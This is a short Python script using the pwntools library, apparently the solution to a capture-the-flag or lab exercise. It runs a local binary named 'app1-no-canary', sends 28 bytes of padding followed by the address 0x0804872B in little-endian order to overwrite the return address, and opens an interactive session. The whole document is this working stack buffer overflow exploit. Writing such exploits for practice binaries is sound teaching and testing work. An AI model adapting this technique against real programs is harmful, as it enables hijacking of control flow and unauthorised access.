from pwn import * 

io = process(["./app1-no-canary"])
payload = 28*b'a'
payload += bytes.fromhex("0804872B")[::-1]
io.sendline(payload)

io.interactive()